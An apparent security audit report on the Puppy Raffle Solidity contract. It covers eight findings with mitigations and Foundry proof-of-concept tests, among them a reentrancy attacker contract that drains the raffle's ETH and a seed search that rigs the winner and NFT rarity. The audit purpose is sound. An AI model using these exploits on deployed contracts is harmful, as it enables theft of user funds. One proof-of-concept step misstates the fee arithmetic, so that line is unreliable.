# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle Protocol**  
Puppy Raffle is an on-chain, winner-takes-most raffle that mints a uniquely-rarified Puppy NFT to the champion.

1. Ticketing  
• Anyone calls `enterRaffle(address[] participants)` sending `entranceFee × n` ETH to register *n* unique addresses.  
• Each address represents one ticket; duplicates revert.  
• A ticket holder can call `refund(index)` to withdraw and delete their slot before the draw.

2. Draw Cycle  
• The raffle starts at deployment and lasts `raffleDuration` seconds.  
• Once the period elapses and ≥ 4 active players remain, the owner calls `selectWinner()`.  
• A pseudo-random index (block.timestamp, block.difficulty, players length) is chosen.  
• Winner receives 80 % of the escrowed pot and is minted one Puppy NFT.  
• NFT rarity is picked on-chain: Common 70 %, Rare 25 %, Legendary 5 %; each rarity maps to its own IPFS image/metadata.

3. Fees & Admin  
• The remaining 20 % accumulates in `totalFees`; owner can update `feeAddress`.  
• `withdrawFees()` transfers fees to `feeAddress` only when no active players remain.

4. Ecosystem  
Built with Solidity 0.7.6, Foundry tests ensure entry, refund, randomness, payouts, NFT URI, and fee logic. `DeployPuppyRaffle.sol` script deploys the contract with preset `entranceFee`, `duration`, and sets the deployer as fee receiver.##Findings by Pattern


 **Derived From** : Pot and fee misaccount due to counting refunded slots (holes) in players

[M-1]. Fee withdrawals perma-stuck: totalFees computed from length includes holes, making balance != totalFees after draw
[M-2]. selectWinner() DoS: prize computed from players.length includes refunded holes, transfer exceeds balance and always reverts



 **Derived From** : Nested O(n^2) duplicate check in enterRaffle enables gas-based DoS

[M-3]. enterRaffle O(n^2) duplicate scan lets attacker bloat players and brick further entries via gas exhaustion



 **Derived From** : Refund reentrancy drains ETH via external call before state update

[H-4]. Reentrant refund() lets a malicious player recursively withdraw entranceFee and drain contract



 **Derived From** : totalFees uses uint64 with unchecked math causing overflow and invariant break

[H-5]. uint64 fee accumulation overflow in PuppyRaffle.selectWinner() breaks balance==totalFees invariant, jamming withdrawFees



 **Derived From** : Percent split rounding leaves dust, blocking fee withdrawals over time

[M-6]. Rounding in PuppyRaffle.selectWinner() leaves 1 wei dust per round, permanently bricking withdrawFees()



 **Derived From** : Winner fallback can revert and grief selectWinner progress

[M-7]. Griefable payout in PuppyRaffle.selectWinner lets malicious winner block draws (DoS)



 **Derived From** : Predictable RNG lets caller/validator bias winner and rarity

[H-8]. Caller/validator-controlled RNG in PuppyRaffle.selectWinner enables hijacking prize and forcing Legendary rarity


### Number of Findings
- C: 0
- H: 3
- M: 5
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Pot and fee misaccount due to counting refunded slots (holes) in players

## [M-1]. Fee withdrawals perma-stuck: totalFees computed from length includes holes, making balance != totalFees after draw

## Derived From Pattern/Invariant
Pot and fee misaccount due to counting refunded slots (holes) in players

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Description
When refunds create holes, selectWinner() uses players.length * entranceFee to compute fee = 20%. If someone force-funds the contract so the inflated prize transfer succeeds, totalFees is also inflated. After prize payment, address(this).balance may be less than totalFees, causing withdrawFees() to revert on its equality check and bricking fee withdrawals.
Vulnerable snippet:
function selectWinner() external {
  uint256 totalAmountCollected = players.length * entranceFee; // counts holes
  uint256 fee = (totalAmountCollected * 20) / 100;
  totalFees = totalFees + uint64(fee);
  ...
}
function withdrawFees() external {
  require(address(this).balance == uint256(totalFees), ...);
  ...
}

## Impact
Fee withdrawals are permanently blocked (require(balance == totalFees) fails) after a misaccounted draw, requiring external value to be forced to the contract to repair equality.

## Proof of Concept
1) Attacker enters 4 addresses, refunds 3 (balance = 1 * F, players.length = 4).
2) Attacker force-funds the contract (e.g., via selfdestruct or miner tip) so that balance >= 3.2 * F; selectWinner() succeeds.
3) totalFees increases by 0.8 * 4 * F = 0.8 * N * F, but actual post-prize balance is 0 (if topped up by exactly 2.2 * F), so balance != totalFees.
4) withdrawFees() reverts forever until someone force-sends more funds to match totalFees.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract AccountingInvariantViolation_FeesLocked_Test is Test {
    PuppyRaffle raffle;
    address attacker = address(0xA11CE);
    address p1 = address(0xB1);
    address p2 = address(0xB2);
    address p3 = address(0xB3);
    address p4 = address(0xB4);
    address fee = address(0xFEE);

    uint256 constant F = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(F, fee, 1);
        vm.deal(attacker, 10 ether);
    }

    function _enterWith4AndRefund3() internal {
        address[] memory addrs = new address[](4);
        addrs[0] = p1; addrs[1] = p2; addrs[2] = p3; addrs[3] = p4;
        vm.prank(attacker);
        raffle.enterRaffle{value: 4 ether}(addrs);
        vm.prank(p1); raffle.refund(0);
        vm.prank(p2); raffle.refund(1);
        vm.prank(p3); raffle.refund(2);
        assertEq(address(raffle).balance, 1 ether);
    }

    function test_FeesStuck_balance_not_equal_totalFees_after_misaccounted_draw() public {
        _enterWith4AndRefund3();
        vm.warp(block.timestamp + raffle.raffleDuration());
        // Force top-up so prize (3.2 ETH) can be paid despite only 1 ETH true pot
        // Set balance to exactly 3.2 ETH (1 + 2.2 top-up)
        vm.deal(address(raffle), 3.2 ether);
        raffle.selectWinner();
        // After prize paid, balance is 0 but totalFees is 0.8 ETH (inflated)
        assertEq(address(raffle).balance, 0);
        assertEq(uint256(raffle.totalFees()), 0.8 ether);
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Compute fee/prize based on the count of active (non-zero) players, not players.length.
- Use swap-and-pop removal in refund() to keep players compact and accurate.
- Change withdrawFees() gating to check players.length == 0 (no active raffle) instead of balance == totalFees, and avoid relying on fragile balance equality.


## [M-2]. selectWinner() DoS: prize computed from players.length includes refunded holes, transfer exceeds balance and always reverts

## Derived From Pattern/Invariant
Pot and fee misaccount due to counting refunded slots (holes) in players

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
refund() zeroes out the player slot without shrinking the array: players[i] = address(0). selectWinner() later computes totalAmountCollected = players.length * entranceFee, counting those zeroed slots. With any refunds, prizePool = 0.8 * players.length * entranceFee exceeds the real escrow (activePlayers * entranceFee), so the ETH transfer to winner fails and selectWinner() reverts, permanently blocking draws until someone force-funds the contract.
Vulnerable snippet:
function refund(uint256 i) public { ... players[i] = address(0); }
function selectWinner() external {
  ...
  uint256 totalAmountCollected = players.length * entranceFee; // counts holes
  uint256 prizePool = (totalAmountCollected * 80) / 100;
  ...
  (bool success,) = winner.call{value: prizePool}("");
  require(success, "PuppyRaffle: Failed to send prize pool to winner");
}

## Impact
Raffle draw is bricked: selectWinner() reverts on every call once any player has refunded, preventing prize distribution, NFT minting, and raffle reset.

## Proof of Concept
1) Attacker enters 4 addresses and pays 4 * entranceFee.
2) Three of those addresses call refund(), creating 3 holes; contract balance becomes 1 * entranceFee but players.length remains 4.
3) After raffleDuration elapses, attacker calls selectWinner(). prizePool = 0.8 * 4 * entranceFee = 3.2 * entranceFee while contract balance = 1 * entranceFee. The ETH transfer fails and the function reverts with 'PuppyRaffle: Failed to send prize pool to winner'.
4) This persists for subsequent calls, locking the raffle until someone force-sends enough ETH to cover the over-inflated prize.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract AccountingInvariantViolation_DoS_Test is Test {
    PuppyRaffle raffle;
    address attacker = address(0xA11CE);
    address p1 = address(0xB1);
    address p2 = address(0xB2);
    address p3 = address(0xB3);
    address p4 = address(0xB4);
    address fee = address(0xFEE);

    uint256 constant F = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(F, fee, 1);
        vm.deal(attacker, 10 ether);
    }

    function _enterWith4AndRefund3() internal {
        address[] memory addrs = new address[](4);
        addrs[0] = p1; addrs[1] = p2; addrs[2] = p3; addrs[3] = p4;
        vm.prank(attacker);
        raffle.enterRaffle{value: 4 ether}(addrs);
        vm.prank(p1); raffle.refund(0);
        vm.prank(p2); raffle.refund(1);
        vm.prank(p3); raffle.refund(2);
        // Balance now only 1 ether, but players.length is still 4
        assertEq(address(raffle).balance, 1 ether);
    }

    function test_DoS_selectWinner_reverts_due_to_overstated_prize() public {
        _enterWith4AndRefund3();
        vm.warp(block.timestamp + raffle.raffleDuration());
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
        // Still stuck with 1 ether in contract; draw remains impossible without external top-up
        assertEq(address(raffle).balance, 1 ether);
    }
}


## Suggested Mitigation
- Maintain accurate active player count and use it for accounting: track activeCount++ on enter, activeCount-- on refund; compute prize/fee from activeCount, not players.length.
- Or remove refunded entries via swap-and-pop to shrink players.length instead of zeroing slots.
- Ensure winner selection skips address(0) entries or is based on a compacted active list.





 **Derived From** : Nested O(n^2) duplicate check in enterRaffle enables gas-based DoS

## [M-3]. enterRaffle O(n^2) duplicate scan lets attacker bloat players and brick further entries via gas exhaustion

## Derived From Pattern/Invariant
Nested O(n^2) duplicate check in enterRaffle enables gas-based DoS

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Description
enterRaffle appends new players, then validates uniqueness by scanning the entire players array with nested loops. This is O(n^2). As players grows, gas cost can exceed per-tx gas, causing enterRaffle to revert and preventing any new entrants. An attacker can repeatedly enter many unique addresses (paying entranceFee × n) to bloat players until subsequent entries are infeasible under typical block gas limits. Vulnerable snippet:

for (uint256 i = 0; i < newPlayers.length; i++) {
    players.push(newPlayers[i]);
}
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

## Impact
Attacker inflates players to a size where the nested duplicate check exceeds gas limits, making future entries revert and halting raffle participation until the round ends/reset. Core user flow (enter) is DoS’d.

## Proof of Concept
1) Attacker funds an EOA with ETH.
2) Attacker calls enterRaffle many times adding unique addresses, growing players.
3) Once players is large enough, subsequent enterRaffle calls require O(n^2) comparisons and run out of gas under a fixed gas cap typical of block limits, reverting. No new users can join until selectWinner resets the array.
4) The test below demonstrates the same fixed gas cap succeeds when players is small but fails after players becomes large, proving gas-based DoS.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../../src/PuppyRaffle.sol";

contract UnboundedLoopsDoSTest is Test {
    PuppyRaffle raffle;

    uint256 constant ENTRANCE_FEE = 0.001 ether;
    address constant FEE_ADDR = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDR, 1 days);
    }

    // Helper: perform a gas-capped enterRaffle for a single address
    function _enterWithGasCap(address newPlayer, uint256 gasCap) internal returns (bool success) {
        address[] memory arr = new address[](1);
        arr[0] = newPlayer;
        (success,) = address(raffle).call{gas: gasCap, value: ENTRANCE_FEE}(
            abi.encodeWithSelector(raffle.enterRaffle.selector, arr)
        );
    }

    function test_GasExhaustionAfterManyPlayers() public {
        // 1. Baseline: with an empty players array the call succeeds under a 2M gas cap
        assertTrue(_enterWithGasCap(address(0x1), 2_000_000));

        // 2. Keep adding unique players under the same gas cap until it fails
        //    (roughly a few hundred players are enough, exact number depends on compiler)
        for (uint256 i = 2; i < 600; i++) {
            bool ok = _enterWithGasCap(address(uint160(i)), 2_000_000);
            if (!ok) {
                // O(n^2) duplicate scan has finally exceeded our fixed gas budget
                break;
            }
        }

        // 3. A fresh attempt with the same gas limit must now revert (return false)
        bool shouldFail = _enterWithGasCap(address(0xFFFFF), 2_000_000);
        assertFalse(shouldFail, "enterRaffle should run out of gas once players is large");
    }
}

## Suggested Mitigation
Avoid scanning the entire players array per entry. Track membership in O(1) using a storage mapping: mapping(address => bool) entered; For each newPlayers[i], require(!entered[p]); set entered[p]=true; push to players. Optionally bound newPlayers.length to a small max and check for intra-batch duplicates using a temporary memory set (mapping(address => bool) seen) to prevent O(n^2) growth. This eliminates quadratic loops and DoS risk.





 **Derived From** : Refund reentrancy drains ETH via external call before state update

## [H-4]. Reentrant refund() lets a malicious player recursively withdraw entranceFee and drain contract

## Derived From Pattern/Invariant
Refund reentrancy drains ETH via external call before state update

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Description
PuppyRaffle.refund(uint256) violates checks-effects-interactions: it sends ETH to msg.sender via Address.sendValue before clearing players[playerIndex]. An attacker enters with a contract account, then calls refund(index). During the external call, their receive/fallback re-enters refund(index) while players[index] is still their address, allowing multiple refunds for the same ticket. Repeating this drains the contract balance. Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, ...);
    require(playerAddress != address(0), ...);
    payable(msg.sender).sendValue(entranceFee); // external call before state change
    players[playerIndex] = address(0);          // state cleared too late
}

No nonReentrant guard; untrusted call precedes state update.

## Impact
Attacker drains all ETH escrowed in the raffle by reentering refund() repeatedly, stealing funds from other participants and leaving the contract balance at 0.

## Proof of Concept
- Attacker deploys a contract with a receive() that calls raffle.refund(index) recursively.
- Attacker registers their contract address as a player among others (funding the pot).
- Attacker computes index of their slot and initial refund iterations as address(raffle).balance / entranceFee.
- Calls refund(index); during sendValue, receive() re-enters refund(index) multiple times before players[index] is cleared.
- Each reentry pays entranceFee; attacker drains the entire contract balance.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RefundReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public index;
    uint256 public remaining;
    address public owner;

    constructor() { owner = msg.sender; }

    function begin(PuppyRaffle _raffle, uint256 _index, uint256 _times) external {
        raffle = _raffle;
        index = _index;
        remaining = _times; // includes the first call below
        raffle.refund(index);
    }

    receive() external payable {
        if (remaining > 1) {
            remaining -= 1;
            raffle.refund(index);
        }
    }

    function sweep() external { payable(owner).transfer(address(this).balance); }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle private raffle;
    RefundReentrancyAttacker private attacker;

    uint256 private constant ENTRANCE_FEE = 1 ether;
    address private feeRecipient = address(100);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeRecipient, 7 days);
        attacker = new RefundReentrancyAttacker();
    }

    function test_refundReentrancy_DrainsETH() public {
        // prepare players (4 innocents + attacker)
        address[] memory players = new address[](5);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        players[4] = address(attacker);

        vm.deal(address(this), 10 ether);
        raffle.enterRaffle{value: ENTRANCE_FEE * players.length}(players);

        uint256 pot = address(raffle).balance;
        uint256 loops = pot / ENTRANCE_FEE; // exact iterations until balance == 0
        uint256 attackerIndex = raffle.getActivePlayerIndex(address(attacker));

        attacker.begin(raffle, attackerIndex, loops);

        assertEq(address(raffle).balance, 0);
        assertEq(address(attacker).balance, pot);
    }
}

## Suggested Mitigation
Move players[playerIndex] = address(0) to occur before the ETH transfer and add the OpenZeppelin ReentrancyGuard modifier to refund(), or simply delete the entry first then send funds. Either change fully blocks the re-entrant path.





 **Derived From** : totalFees uses uint64 with unchecked math causing overflow and invariant break

## [H-5]. uint64 fee accumulation overflow in PuppyRaffle.selectWinner() breaks balance==totalFees invariant, jamming withdrawFees

## Derived From Pattern/Invariant
totalFees uses uint64 with unchecked math causing overflow and invariant break

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
In Solidity 0.7.6 arithmetic is unchecked. PuppyRaffle accumulates protocol fees in a uint64, but computes fee in uint256 and then casts: totalFees = totalFees + uint64(fee). When fee >= 2^64 wei (~18.446 ether) the cast truncates modulo 2^64, and the addition can wrap. The contract’s ETH balance still increases by the full fee while totalFees stores only fee % 2^64, permanently violating the invariant used by withdrawFees(): require(address(this).balance == uint256(totalFees), ...). This bricks fee withdrawal even when no players are active.

Vulnerable snippet:

function selectWinner() external {
    ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee); // truncates and overflows uint64 in 0.7.6
    ...
}

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    ...
}

## Impact
Triggering a single raffle round whose 20 % fee is ≥ 2^64 wei (≈ 18.45 ETH) causes the cast to uint64 to wrap and store only fee mod 2^64. The contract balance therefore exceeds totalFees forever. Because withdrawFees() requires strict equality, the function will *always* revert after the first overflowing round. The whole fee pot—including all future fees—is permanently locked in the contract, representing an irreversible monetary loss for the protocol owner.

## Proof of Concept
1. Choose entranceFee so that 20 % of 5 tickets > 2^64 wei, e.g. entranceFee = 20 ETH (pot = 100 ETH, fee = 20 ETH).
2. Five addresses call enterRaffle, sending 100 ETH in total.
3. After raffleDuration, anyone calls selectWinner().
   • Contract balance now holds 20 ETH in fees.
   • totalFees stores 20 ETH mod 2^64 = 20 ETH – 2^64 wei ≈ 1.55 ETH (truncated).
4. Any call to withdrawFees() reverts forever because balance ≠ totalFees.
5. All subsequently accrued fees will also be stranded.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract TotalFeesOverflowTest is Test {
    PuppyRaffle raffle;
    address feeReceiver = address(0xFEE);

    function setUp() public {
        // entranceFee picked so that 20 % of 5 tickets > 2^64 wei (≈18.45 ETH)
        raffle = new PuppyRaffle(20 ether, feeReceiver, 1);

        // fund 5 distinct EOAs
        for (uint160 i = 1; i <= 5; i++) {
            vm.deal(address(i), 25 ether);
        }
    }

    function test_FeeOverflowLocksWithdraw() public {
        address[] memory entrants = new address[](5);
        for (uint160 i = 1; i <= 5; i++) {
            entrants[i - 1] = address(i);
        }

        vm.prank(address(1));
        raffle.enterRaffle{value: 100 ether}(entrants); // 5 × 20 ETH

        vm.warp(block.timestamp + 2);
        raffle.selectWinner();

        // Balance > stored totalFees after overflow
        assertGt(address(raffle).balance, uint256(raffle.totalFees()));

        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
1. Change totalFees to uint256 and use `totalFees += fee;` (no cast, no overflow).
2. Replace the fragile equality gate with an explicit player check:
   `require(players.length == 0, "PuppyRaffle: There are currently players active");`
   This prevents future accounting mismatches from blocking withdrawals.





 **Derived From** : Percent split rounding leaves dust, blocking fee withdrawals over time

## [M-6]. Rounding in PuppyRaffle.selectWinner() leaves 1 wei dust per round, permanently bricking withdrawFees()

## Derived From Pattern/Invariant
Percent split rounding leaves dust, blocking fee withdrawals over time

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner() splits the pot via floor division: prizePool=(T*80)/100 and fee=(T*20)/100. When T % 5 != 0, floor(0.8T)+floor(0.2T)=T-1, leaving 1 wei dust in the contract each such round. The contract balance becomes totalFees + accumulated_dust, but withdrawFees() strictly requires address(this).balance == totalFees, so it reverts forever after the first dusty round. Vulnerable snippet:

uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
...
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
Permanent DoS of fee withdrawals; totalFees becomes unwithdrawable as contract balance remains greater than totalFees by accumulated dust.

## Proof of Concept
- Attacker ensures totalAmountCollected % 5 != 0 by choosing players.length such that players.length * entranceFee % 5 != 0.
- Wait for raffleDuration, then attacker calls selectWinner().
- Prize and fee are floored, leaving 1 wei dust in contract balance while totalFees only tracks the floored fee.
- Now address(this).balance = totalFees + dust; withdrawFees() requires exact equality and reverts.
- Repeating rounds accumulates dust, permanently bricking fee withdrawals.

## Proof of Code
pragma solidity >=0.7.6 <0.9.0;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PrecisionDriftAccumulationTest is Test {
    PuppyRaffle raffle;
    address attacker = address(0xA11CE);
    address feeReceiver = address(0xFEE);

    function setUp() public {
        // Choose an entranceFee not divisible by 5 to easily create dust
        uint256 entranceFee = 7; // 7 % 5 != 0
        uint256 duration = 1;
        raffle = new PuppyRaffle(entranceFee, feeReceiver, duration);
        vm.deal(attacker, 1 ether);
    }

    function test_PrecisionDustBricksWithdrawFees() public {
        uint256 entranceFee = raffle.entranceFee();

        // Prepare 4 unique players (meets >=4 requirement)
        address[] memory addrs = new address[](4);
        addrs[0] = vm.addr(11);
        addrs[1] = vm.addr(12);
        addrs[2] = vm.addr(13);
        addrs[3] = vm.addr(14);

        // Enter with totalAmountCollected = 4 * 7 = 28 (not divisible by 5)
        vm.prank(attacker);
        raffle.enterRaffle{value: entranceFee * addrs.length}(addrs);

        // Raffle can be drawn
        vm.warp(block.timestamp + raffle.raffleDuration() + 1);

        // Anyone can call selectWinner; attacker triggers it
        vm.prank(attacker);
        raffle.selectWinner();

        // Check state: prize=(28*80)/100=22, fee=(28*20)/100=5, dust=28-22-5=1
        uint256 bal = address(raffle).balance; // should be fee + dust = 6
        uint256 fees = uint256(raffle.totalFees()); // should be 5
        assertEq(fees, 5, "totalFees tracked incorrectly");
        assertEq(bal, 6, "contract balance should be fee + dust");
        assertEq(bal, fees + 1, "dust present causing mismatch");

        // Withdraw should revert due to strict equality check
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Eliminate dust by making fee the remainder: compute prizePool first, then fee = totalAmountCollected - prizePool, ensuring prize + fee == total.
  Example:
  uint256 prizePool = (totalAmountCollected * 80) / 100;
  uint256 fee = totalAmountCollected - prizePool; // captures any remainder
- Alternatively, relax withdrawFees guard to check no active players and sufficient balance instead of equality:
  require(players.length == 0, "No active players");
  require(address(this).balance >= totalFees, "Insufficient balance");
  This avoids bricking even if dust exists.





 **Derived From** : Winner fallback can revert and grief selectWinner progress

## [M-7]. Griefable payout in PuppyRaffle.selectWinner lets malicious winner block draws (DoS)

## Derived From Pattern/Invariant
Winner fallback can revert and grief selectWinner progress

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner pays the chosen winner via a raw call and requires success: (bool success,) = winner.call{value: prizePool}(""); require(success, "PuppyRaffle: Failed to send prize pool to winner"); If the winner is a contract whose receive/fallback reverts, the entire transaction reverts with no alternative execution path. An attacker can enter the raffle with multiple reverting contracts so that any selected winner reverts, indefinitely preventing the raffle from progressing (players array never cleared, raffleStartTime not updated, no NFT mint).

## Impact
Any reverting winner blocks selectWinner, preventing new rounds, prize payout, NFT minting and fee withdrawal. All ETH sent by honest entrants remains locked in the contract until the bug is fixed by an upgrade or migration. This is a repeatable, permission-less DoS that requires admin intervention and impacts user funds, meeting Medium severity.

## Proof of Concept
1) Attacker deploys N malicious contracts that revert in receive/fallback. 2) Attacker enters the raffle with these N addresses (duplicates disallowed but distinct contracts allowed). 3) After duration, any call to selectWinner picks a winner from the malicious set; prize transfer reverts; selectWinner reverts; state unchanged. 4) Repeat indefinitely; raffle cannot progress.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RevertingWinner {
    receive() external payable { revert("nope"); }
    fallback() external payable { revert("nope"); }
}

contract GriefableCallbacksTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 hours);
    }

    function test_DoS_selectWinner_RevertingWinnersBlockDraw() public {
        // Deploy 4 reverting recipients
        RevertingWinner w1 = new RevertingWinner();
        RevertingWinner w2 = new RevertingWinner();
        RevertingWinner w3 = new RevertingWinner();
        RevertingWinner w4 = new RevertingWinner();

        address[] memory entrants = new address[](4);
        entrants[0] = address(w1);
        entrants[1] = address(w2);
        entrants[2] = address(w3);
        entrants[3] = address(w4);

        address funder = address(0xB0B);
        vm.deal(funder, 10 ether);
        vm.prank(funder);
        raffle.enterRaffle{value: FEE * entrants.length}(entrants);

        // Sanity: first player is w1
        assertEq(raffle.players(0), address(w1));
        assertEq(raffle.previousWinner(), address(0));

        // Advance beyond raffle duration
        vm.warp(block.timestamp + 2 hours);

        // Any winner is reverting -> payout fails -> selectWinner reverts
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // State unchanged (no progress)
        assertEq(raffle.players(0), address(w1));
        assertEq(raffle.previousWinner(), address(0));
    }
}


## Suggested Mitigation
- Use a pull payment pattern instead of pushing ETH. If the immediate transfer fails, record prizePool as credit and allow the winner to claim via a separate claimPrize() function.
- Alternatively, wrap the transfer in a best-effort send (low-level call without require) and escrow the amount on failure for later manual claim by the winner.
- Do not block state progression on payout failure; proceed with round reset and NFT mint, and let the winner withdraw their prize later.
- Consider a reentrancy guard around state changes and external calls as a defense-in-depth measure.





 **Derived From** : Predictable RNG lets caller/validator bias winner and rarity

## [H-8]. Caller/validator-controlled RNG in PuppyRaffle.selectWinner enables hijacking prize and forcing Legendary rarity

## Derived From Pattern/Invariant
Predictable RNG lets caller/validator bias winner and rarity

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
RequiresRole

## Description
selectWinner() derives both the winner index and NFT rarity from manipulable, same-tx entropy: msg.sender, block.timestamp, and block.difficulty. A caller can choose msg.sender; a validator/builder can choose whether/when to include the tx and skew timestamp/difficulty (prevrandao). No commit-reveal or VRF is used. Vulnerable snippet:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
...
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

This lets an attacker (as block producer or with builder collusion) simulate seeds and only include the transaction when winnerIndex targets their ticket and rarity >= 96 (Legendary), redirecting the 80% prize to themselves and minting the best rarity.

## Impact
Validator/builder can deterministically select themselves (or a controlled address) as the winner to steal 80% of the pot and force Legendary rarity, breaking fairness and causing direct monetary loss to other entrants.

## Proof of Concept
Any user can choose msg.sender and defer the draw call until a block with a convenient timestamp/difficulty pair. A block producer (or a user colluding with one) pre-computes many (timestamp,difficulty) candidates offline and keeps the transaction in the mem-pool. The tx is only inserted when
keccak256(msg.sender,timestamp,difficulty) % players.length == myIndex  AND
keccak256(msg.sender,difficulty) % 100 >= 96.
Because both timestamp and difficulty are miner-controlled and msg.sender is controlled by the caller, the attacker can make the hash point to their ticket and to a Legendary rarity. Once the favourable pair is found, the miner includes the transaction, the attacker gets 80 % of the pot and a guaranteed Legendary NFT; everybody else loses their stake.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RNGBiasTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;

    address p1 = address(0x1);
    address p2 = address(0x2);
    address attackerPlayer = address(0xAA);
    address p3 = address(0x3);
    address attackerCaller = address(0xBB);

    function setUp() public {
        vm.deal(p1, 5 ether);
        vm.deal(p2, 5 ether);
        vm.deal(p3, 5 ether);
        vm.deal(attackerPlayer, 5 ether);

        raffle = new PuppyRaffle(ENTRANCE, address(0xFEE), 1);

        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = attackerPlayer; // target index = 2
        players[3] = p3;

        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(players);
        vm.warp(block.timestamp + 2); // raffle ended
    }

    function testMinerCanForceWin() public {
        uint256 targetIdx = 2;
        uint256 ts = block.timestamp;
        uint256 foundDiff = 0;

        // Lightweight offline-style search (< 10k iterations)
        for (uint256 d = 1; d < 10_000; d++) {
            if (uint256(keccak256(abi.encodePacked(attackerCaller, ts, d))) % 4 == targetIdx) {
                if (uint256(keccak256(abi.encodePacked(attackerCaller, d))) % 100 >= 96) {
                    foundDiff = d;
                    break;
                }
            }
        }
        assertGt(foundDiff, 0, "seed not found in search window");

        uint256 balBefore = attackerPlayer.balance;
        vm.difficulty(foundDiff);          // miner chooses difficulty
        vm.prank(attackerCaller);          // caller chooses msg.sender
        raffle.selectWinner();

        // attackerPlayer should be the recorded winner and receive the prize
        assertEq(raffle.previousWinner(), attackerPlayer);
        uint256 prize = (4 * ENTRANCE * 80) / 100;
        assertEq(attackerPlayer.balance, balBefore + prize);
        assertEq(raffle.tokenIdToRarity(0), raffle.LEGENDARY_RARITY());
    }
}

## Suggested Mitigation
Use an unbiased RNG: (a) Chainlink VRF v2 or (b) a commit-reveal with delay and unbiased entropy (prevrandao) not controlled by caller. Remove msg.sender from entropy and do not use same-tx block vars. Snapshot players before requesting randomness; on fulfillment, compute winnerIndex with VRF output. For rarity, derive from the same VRF output (e.g., uint256(vrf) % 100) rather than caller-controlled inputs.



